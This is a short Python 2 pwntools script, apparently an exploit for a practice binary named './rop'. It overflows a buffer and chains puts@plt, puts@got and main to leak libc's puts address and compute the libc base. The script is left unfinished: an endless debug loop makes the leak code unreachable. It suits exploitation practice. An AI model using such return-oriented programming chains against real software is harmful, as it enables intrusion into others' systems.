#!/usr/bin/env python2
from __future__ import print_function
from pwn import *


def main(fn='./rop'):
    e = ELF(fn)
    libc = ELF('/lib32/libc.so.6')
    p = process([fn])

    # p.sendline()
    # p.interactive()
    pwn = cyclic_find(b'faaa', n=4) * 'A'
    pwn += p32(e.plt['puts'])
    pwn += p32(e.got['puts'])
    pwn += p32(e.symbols['main'])
    p.recvuntil('> ')
    p.sendline(pwn)

    s = ''
    while 1:
        print(s)
        s += p.recv(1)
    return

    leak = u32(p.recv(4))
    log.info('Address of puts: ' + hex(leak))

    libc_base = leak - libc.symbols['puts']
    log.info('Address of libc: ' + hex(libc_base))


if __name__ == '__main__':
    main()
